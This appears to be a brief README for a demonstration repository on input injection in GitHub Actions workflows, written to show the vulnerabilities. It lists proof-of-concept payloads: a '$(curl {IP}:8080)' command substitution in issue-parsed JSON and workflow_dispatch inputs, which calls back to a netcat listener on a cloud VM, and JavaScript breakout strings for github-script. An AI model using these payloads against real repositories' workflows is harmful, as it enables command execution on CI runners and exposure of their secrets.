# actions-input-security
The repository demonstrates two potential vulnerabilities when using inputs in actions workflows.  

# Exploit 1: Using user input (via issue parser) in run commands
Launch a VM in the cloud. Open a publicly accessible port on the VM using `nc -vlnk 0.0.0.0 8080`. 
```
    ```json
    {
        "version": "$(curl {IP}:8080)"
    }
    ```
```
# Exploit 1a: Using user input in run commands
Launch a VM in the cloud. Open a publicly accessible port on the VM using `nc -vlnk 0.0.0.0 8080`.  
Use the following as input for workflow_dispatch: `$(curl {IP}:8080)`  

# Exploit 2: Using user input (via issue parser) in github-script action
```
    ```json
    {
        "version": "'};console.log('hophophop!!!');//"
    }
    ```
```

# Exploit 2a: Using user input in github-script action
Use the following as input for workflow_dispatch: `};console.log('hophophop!!!');//`  
